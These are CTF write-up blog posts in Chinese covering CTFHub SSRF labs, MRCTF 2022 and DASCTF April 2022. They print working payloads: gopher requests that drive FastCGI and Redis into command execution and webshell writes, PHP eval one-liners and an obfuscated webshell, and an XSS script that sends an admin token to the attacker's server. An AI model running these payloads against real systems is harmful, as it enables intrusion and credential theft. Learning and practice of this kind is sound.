http:&#x2F;&#x2F;challenge-351296691c42d118.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.01:80&#x2F;_POST%2520%2Fflag.php%2520HTTP%2F1.1%250d%250AHost%3A127.0.0.1%250d%250AContent-Type%3Aapplication%2Fx-www-form-urlencoded%250d%250AContent-Length%3A36%250d%250A%250d%250Akey%3D646e343c70a1b9d07661c4343b0e5e72%250d%250A 第一个是对 POST &#x2F;flag.php HTTP&#x2F;1.1 Host:127.0.0.1 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 36 key&#x3D;646e343c70a1b9d07661c4343b0e5e72 用谷歌的hackbar上的自带的url编码进行一次编码，将换行符%0A换为%0D%0A，然后再编码一次 第二个是直接改之前测试post的时候的值 curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A 然后再用谷歌的hackbar进行一次编码 上传文件和post差不多吗，但是要穿的是文件，所以改一下前端页面，加个提交按钮，抓包 然后直接把整个请求包改了host之后去url编码一次 POST &#x2F;flag.php HTTP&#x2F;1.1 Host: 127.0.0.1:80 Content-Length: 308 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800 Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryXT85fz2P3lDnY3Aw User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36 Edg&#x2F;100.0.1185.50 Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9 Referer: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;127.0.0.1&#x2F;flag.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6 Connection: close ------WebKitFormBoundaryXT85fz2P3lDnY3Aw Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.pdf&quot; Content-Type: application&#x2F;pdf &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; ------WebKitFormBoundaryXT85fz2P3lDnY3Aw Content-Disposition: form-data; name&#x3D;&quot;file&quot; æäº¤ ------WebKitFormBoundaryXT85fz2P3lDnY3Aw-- 然后再将%0a变为%0d%0a，然后再编码一次 最终payload gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520308%250D%250APragma%253A%2520no-cache%250D%250ACache-Control%253A%2520no-cache%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F100.0.4896.127%2520Safari%252F537.36%2520Edg%252F100.0.1185.50%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen%253Bq%253D0.8%252Cen-GB%253Bq%253D0.7%252Cen-US%253Bq%253D0.6%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.pdf%2522%250D%250AContent-Type%253A%2520application%252Fpdf%250D%250A%250D%250A%253C%253Fphp%2520%2540eval(%2524_POST%255B%2522a%2522%255D)%253B%253F%253E%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw-- FastCGI协议方法一： 直接上gopherus 其中/usr/local/lib/php/PEAR.php 为安装php时默认自带的php文件 先ls /，再cat，在url中要先把这个payload的值再url编码一次，才能拿到flag http:&#x2F;&#x2F;challenge-5da7279b1e83a566.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%251BSCRIPT_FILENAME%2Fusr%2Flocal%2Flib%2Fphp%2FPEAR.php%250D%2501DOCUMENT_ROOT%2F%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_52cc1357979c158b0cb02c8ff00b83b1%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500 方法二： https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 p牛的脚本fpm.py 开两个终端，一个监听自己的9000端口 另一个执行脚本 命令：python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件] python3 fpm.py 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -c &quot;&lt;?php system(&#39;ls&#39;);?&gt;&quot; 得到exp.txt 进行url编码 #python2 from urllib import quote f &#x3D; open(&#39;D:\\Desktop\\exp.txt&#39;) ff &#x3D; f.read() print(&#39;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_&#39;+quote(ff)) #gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%E8u%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E8u%01%DB%00%00%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B %17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0C%00QUERY_STRING%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985% 0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%10CONTENT_TYPEapplication&#x2F;text%0E%02CONTENT_LENGTH21%09%1FPHP_VALUEauto_prepend_file%20%3D%20ph p%3A&#x2F;&#x2F;input%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%01%04%E8u%00%00%00%00%01%05%E8u%00%15%00%00%3C%3Fphp%20system%28%27ls%27%29%3B%3F%3E%01%05%E8u%00%00%00%00 再对得到的结果进行再次编码 http:&#x2F;&#x2F;challenge-1c4d6ae123d715b8.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%25E8u%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%25E8u%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI%2F1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250B%2517SCRIPT_NAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%250F%250ESERVER_SOFTWAREphp%2Ffcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250C%2510CONTENT_TYPEapplication%2Ftext%250E%2502CONTENT_LENGTH21%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%25E8u%2500%2500%2500%2500%2501%2505%25E8u%2500%2515%2500%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253B%253F%253E%2501%2505%25E8u%2500%2500%2500%2500 成功读到了文件，后边就是ls /然后cat /flag的操作了 看到有wp用的写一句话木马的方式，然后蚁剑连接，但是我没复现成功 https://blog.csdn.net/unexpectedthing/article/details/121643002?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1 redis协议直接上gopherus 这里如果php payload按默认的来的话应该是一个以cmd为密码的一句话木马 url&#x3D;gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_%252A%2527%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A 同样是再编码一次然后上传，之后访问shell.php就能看见结果了 URL Bypass 要求必须有http://notfound.ctfhub.com 可以利用@来绕过 http:&#x2F;&#x2F;challenge-eb34acd716115c01.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php 数字IP Bypassban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1 0.0.0.0 localhost 还有本地回环的其他表示方法 http://[::ffff:7f00:1] http://0:80 ip十六进制 ip八进制 顺带一提这个正则匹配的过滤，好像还过滤了http://和/flag.php之间的点，但是你只要去了前边的http://就能绕过了 ip十进制 302跳转 Bypass感觉题目环境有点问题，利用短链接并不能实现跳转，只能file协议读一下源码 然后localhost或者0.0.0.0就过了 对不起，我道歉，不是环境的问题，是国内的那些短链接生成网站的问题。。。 用这个https://tinyurl.com/app/ DNS重绑定 Bypass浅谈DNS重绑定漏洞 - 知乎 (zhihu.com) DNS Rebinding 在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。 具体步骤 攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network 攻击者通过一些方式诱导受害者加载http://rebind.network 用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址 恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效 从http://rebind.network加载的网页包含恶意的js代码,构造恶意的请求到http://rebind.network/index,而受害者的浏览器便在执行恶意请求 一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让http://rebind.network绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果 同源策略的失效 对于WEB的同源策略相信大家都很熟悉,如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源,而不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。 当然,页面中的链接，重定向以及表单提交是不会受到同源策略限制的,并且,跨域资源的引入是可以的。但是js不能读写加载的内容。 同源策略确实提高了web的安全性,但是对于DNS Rebinding来说是没有作用的,因为同源策略看的是域名,并不是背后的IP地址,虽然两次的请求IP地址不同,但是由于DNS服务器的绑定,域名都是一样的,那么自然不违反同源策略. https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg 在这个网站设置 然后访问就行了，如果没有的话多刷新几次，因为生成的主机名将随机解析为使用非常低的 ttl 指定的地址之一。","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"ssrf","slug":"ssrf","permalink":"https://ethe448.github.io/tags/ssrf/"}]},{"title":"2022MRCTF复现","slug":"2022MRCTF复现","date":"2022-04-25T12:52:32.000Z","updated":"2022-04-29T15:22:50.593Z","comments":true,"path":"2022/04/25/2022MRCTF复现/","link":"","permalink":"https://ethe448.github.io/2022/04/25/2022MRCTF%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"我太菜了，只能靠看别人的wp来复现过日子了 WebCheckIn好骚的思路，从来没有想过能这样 一个只能传php文件的文件上传，但是检测到一些命令执行或者其他的内容就会报错。 方法一 r4kapig的wp里的方式，利用new ERROR(1);来抛出错误 但是事实上这应该是这道题的后端用来过滤上传的php文件里的内容的代码导致的，这个检测感觉有点神奇。利用new一个类之后后边不管是什么都能传上去，只不过只有new一个php的基类时上传的php文件才不会因为报错而导致停止执行。也就是说，这里随便new一个基类就行 然后执行grep命令找flag就行 方法二 这是wm的wp里的方法 一个靠构造CHR以及动态拼接特性构造出的一个很离谱的webshell &lt;?php (((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^((.999999999999999).(.999999999999999))).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(9)))))($_POST[1]) ?&gt; God_of_GPA先注册个账号，然后登录 我们可以看到这里有token，这应该是负责认证用户身份的。 登录之后在查看成绩里有个只有管理员才能看的按钮，而且我们还可以发垃圾话，然后将id提交给管理员让他看。这道题就是让我们利用xss来获取管理员的token来得到flag &lt;div id=\"scrip\"> console.log(\"injected\"); let uri = window.location.href + \"\"; if (uri.indexOf('token') > -1)&#123; location.href=\"//服务器ip/flag?f=\"+encodeURIComponent(uri) &#125;else&#123; location.href=\"http://brtserver.node3.mrctf.fun/oauth/authorize?redirect_uri=\"+window.location.href &#125; &lt;/div> &lt;img src='data:,\"onerror=\"eval(scrip.innerText)' id=\"MyImg\" /> 然后我们将uuid提交给管理员 就可以在服务器的日志里找到管理员的token 回到login路径下把token换掉就行了 这里xss的利用好像主要是Dom Clobbering技术来触发的dom型xss （说起来因为dom型xss利用的少，我还是第一次见 使用 Dom Clobbering 扩展 XSS - 先知社区 (aliyun.com) 附一个出题人写的 MRCTF2022_God_of_GPA_WP - Welcome to fallingblog (ibukifalling.github.io) 发现好像只有这两个能复现。。。其他的都是Java安全了，放一下y4师傅的java题的wp，以后学会Java之后再看 2022MRCTF-Java部分 | Y4tacker&#39;s Blog","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"2022DASCTF Apr复现","slug":"2022DASCTF-Apr复现","date":"2022-04-24T13:43:49.000Z","updated":"2022-04-25T12:57:40.212Z","comments":true,"path":"2022/04/24/2022DASCTF-Apr复现/","link":"","permalink":"https://ethe448.github.io/2022/04/24/2022DASCTF-Apr%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"纯复现了，没打 Misc当时就看了看这一个misc，觉得应该是有文件，但是没提出来 SimpleFlow一道流量分析题，用wireshark打开，然后追踪一下tcp流，看起来想是蚁剑的流量特征，在第52流看到了flag的zip 变成原始数据 很明显的504b的zip文件头，复制出来放010里另存为拿到zip文件，但是需要密码，再看看第50流 url解码后 我们直接找m8f8d9db647ecd对应的值，然后把它base64解码 但是还是没有找到密码，而我们发现url解码后的数据还有其他的参数，但是并不能直接base64解码，这是因为传参之后被substr去掉了前面两位 所以我们可以去掉前两位之后再解码，在g479cf6f058cf8对应的Y2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0Ijt6aXAgLVAgUGFTc1ppUFdvckQgZmxhZy56aXAgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd中得到我们的密码 PaSsZiPWorD 解压缩，拿到flag webwarmup-php这题看起来很麻烦，但是如果自己一步一步调试，还是很好出的 &lt;?php spl_autoload_register(function($class)&#123; require(&quot;.&#x2F;class&#x2F;&quot;.$class.&quot;.php&quot;); &#125;); highlight_file(__FILE__); error_reporting(0); $action &#x3D; $_GET[&#39;action&#39;]; $properties &#x3D; $_POST[&#39;properties&#39;]; class Action&#123; public function __construct($action,$properties)&#123; $object&#x3D;new $action(); foreach($properties as $name&#x3D;&gt;$value) $object-&gt;$name&#x3D;$value; $object-&gt;run(); &#125; &#125; new Action($action,$properties); ?&gt; 先看第一段，action是类名，properties的key是属性，value是值 所以我们的赋值就要依靠properties 然后调用action定义的类里的run方法 run方法在ListView.php里 &lt;?php class ListView &#123; public $tagName&#x3D;&#39;div&#39;; public $template &#x3D; &#39;flag&#39;; public function run() &#123; echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\\n&quot;; $this-&gt;renderContent(); echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\\n&quot;; &#125; public function renderContent() &#123; ob_start(); echo preg_replace_callback(&quot;&#x2F;&#123;(\\w+)&#125;&#x2F;&quot;,array($this,&#39;renderSection&#39;),$this-&gt;template); ob_end_flush(); &#125; protected function renderSection($matches) &#123; $method&#x3D;&#39;render&#39;.$matches[1]; if(method_exists($this,$method)) &#123; $this-&gt;$method(); $html&#x3D;ob_get_contents(); ob_clean(); return $html; &#125; else return $matches[0]; &#125; &#125; run-&gt;renderContent-&gt;renderSection 在renderContent中利用preg_replace_callback对template中的值进行了正则匹配，如果匹配到{\\w+}就调用renderSection，而将匹配到的结果进行参数传入renderSection，而在renderSection中将$matches[1]与render进行了一个拼接，并检测是否有这个方法，有就去执行它。 我们可以调试一下看看匹配到的参数matches是什么形式的 经过调试我们发现，如果template是{TableBody}，那么经过renderSection，就会调用TestView里的renderTableBody方法 &lt;?php class TestView extends ListView &#123; const FILTER_POS_HEADER&#x3D;&#39;header&#39;; const FILTER_POS_BODY&#x3D;&#39;body&#39;; public $columns&#x3D;array(); public $rowCssClass&#x3D;array(&#39;odd&#39;,&#39;even&#39;); public $rowCssClassExpression; public $rowHtmlOptionsExpression; public $selectableRows&#x3D;1; public $data&#x3D;array(1,2,3); public $filterSelector&#x3D;&#39;&#123;filter&#125;&#39;; public $filterCssClass&#x3D;&#39;filters&#39;; public $filterPosition&#x3D;&#39;body&#39;; public $filter; public $hideHeader&#x3D;false; public function renderTableHeader() &#123; if(!$this-&gt;hideHeader) &#123; echo &quot;&lt;thead&gt;\\n&quot;; if($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_HEADER) $this-&gt;renderFilter(); if($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_BODY) $this-&gt;renderFilter(); echo &quot;&lt;&#x2F;thead&gt;\\n&quot;; &#125; elseif($this-&gt;filter!&#x3D;&#x3D;null &amp;&amp; ($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_HEADER || $this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_BODY)) &#123; echo &quot;&lt;thead&gt;\\n&quot;; $this-&gt;renderFilter(); echo &quot;&lt;&#x2F;thead&gt;\\n&quot;; &#125; &#125; public function renderFilter() &#123; if($this-&gt;filter!&#x3D;&#x3D;null) &#123; echo &quot;&lt;tr class&#x3D;\\&quot;&#123;$this-&gt;filterCssClass&#125;\\&quot;&gt;\\n&quot;; echo &quot;&lt;&#x2F;tr&gt;\\n&quot;; &#125; &#125; public function renderTableRow($row) &#123; $htmlOptions&#x3D;array(); if($this-&gt;rowHtmlOptionsExpression!&#x3D;&#x3D;null) &#123; $data&#x3D;$this-&gt;data[$row]; $options&#x3D;$this-&gt;evaluateExpression($this-&gt;rowHtmlOptionsExpression,array(&#39;row&#39;&#x3D;&gt;$row,&#39;data&#39;&#x3D;&gt;$data)); if(is_array($options)) $htmlOptions &#x3D; $options; &#125; if($this-&gt;rowCssClassExpression!&#x3D;&#x3D;null) &#123; $data&#x3D;$this-&gt;dataProvider-&gt;data[$row]; $class&#x3D;$this-&gt;evaluateExpression($this-&gt;rowCssClassExpression,array(&#39;row&#39;&#x3D;&gt;$row,&#39;data&#39;&#x3D;&gt;$data)); &#125; elseif(is_array($this-&gt;rowCssClass) &amp;&amp; ($n&#x3D;count($this-&gt;rowCssClass))&gt;0) $class&#x3D;$this-&gt;rowCssClass[$row%$n]; if(!empty($class)) &#123; if(isset($htmlOptions[&#39;class&#39;])) $htmlOptions[&#39;class&#39;].&#x3D;&#39; &#39;.$class; else $htmlOptions[&#39;class&#39;]&#x3D;$class; &#125; &#125; public function renderTableBody() &#123; $data&#x3D;$this-&gt;data; $n&#x3D;count($data); echo &quot;&lt;tbody&gt;\\n&quot;; if($n&gt;0) &#123; for($row&#x3D;0;$row&lt;$n;++$row) $this-&gt;renderTableRow($row); &#125; else &#123; echo &#39;&lt;tr&gt;&lt;td colspan&#x3D;&quot;&#39;.count($this-&gt;columns).&#39;&quot; class&#x3D;&quot;empty&quot;&gt;&#39;; echo &quot;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;\\n&quot;; &#125; echo &quot;&lt;&#x2F;tbody&gt;\\n&quot;; &#125; &#125; renderTableBody-&gt;renderTableRow-&gt;evaluateExpression而我们的目的就是调用evaluateExpression里的eval来命令执行 public function evaluateExpression($_expression_,$_data_&#x3D;array()) &#123; if(is_string($_expression_)) &#123; extract($_data_); return eval(&#39;return &#39;.$_expression_.&#39;;&#39;); &#125; else &#123; $_data_[]&#x3D;$this; return call_user_func_array($_expression_, $_data_); &#125; &#125; 要想从renderTableBody到renderTableRow，就要给data赋值，让它不为空 要想从renderTableRow到evaluateExpression，就要给renderTableRow赋值，让它不为空，而这个值会直接传给evaluateExpression中的eval来执行命令。 最终payload 这里是TestView而不是ListView应该是因为继承的问题，子类可以调用父类的方法 soeasy_php 源码里有个注释的更换头像的按钮，把注释去掉抓一下包 这里存在两个参数，经过测试发现png这里有任意文件读取 要用绝对路径，相对路径访问的时候会404 edit.php &lt;?php ini_set(&quot;error_reporting&quot;,&quot;0&quot;); class flag&#123; public function copyflag()&#123; exec(&quot;&#x2F;copyflag&quot;); &#x2F;&#x2F;以root权限复制&#x2F;flag 到 &#x2F;tmp&#x2F;flag.txt，并chown www-data:www-data &#x2F;tmp&#x2F;flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125; &#125; function filewrite($file,$data)&#123; unlink($file); file_put_contents($file, $data); &#125; if(isset($_POST[&#39;png&#39;]))&#123; $filename &#x3D; $_POST[&#39;png&#39;]; if(!preg_match(&quot;&#x2F;:|phar|\\&#x2F;\\&#x2F;|php&#x2F;im&quot;,$filename))&#123; $f &#x3D; fopen($filename,&quot;r&quot;); $contents &#x3D; fread($f, filesize($filename)); if(strpos($contents,&quot;flag&#123;&quot;) !&#x3D;&#x3D; false)&#123; filewrite($filename,&quot;Don&#39;t give me flag!!!&quot;); &#125; &#125; if(isset($_POST[&#39;flag&#39;])) &#123; $flag &#x3D; (string)$_POST[&#39;flag&#39;]; if ($flag &#x3D;&#x3D; &quot;Give me flag&quot;) &#123; filewrite(&quot;&#x2F;tmp&#x2F;flag.txt&quot;, &quot;Don&#39;t give me flag&quot;); sleep(2); die(&quot;no no no !&quot;); &#125; else &#123; filewrite(&quot;&#x2F;tmp&#x2F;flag.txt&quot;, $flag); &#x2F;&#x2F;不给我看我自己写个flag。 &#125; $head &#x3D; &quot;uploads&#x2F;head.png&quot;; unlink($head); if (symlink($filename, $head)) &#123; echo &quot;成功更换头像&quot;; &#125; else &#123; unlink($filename); echo &quot;非正常文件，已被删除&quot;; &#125;; &#125; &#125; 看到__destruct这种魔术方法和preg_match里的phar就感觉像一个phar反序列化 class flag&#123; public function copyflag()&#123; exec(&quot;&#x2F;copyflag&quot;); &#x2F;&#x2F;以root权限复制&#x2F;flag 到 &#x2F;tmp&#x2F;flag.txt，并chown www-data:www-data &#x2F;tmp&#x2F;flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125; &#125; $a &#x3D; new flag(); $phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件 $phar-&gt;startBuffering(); 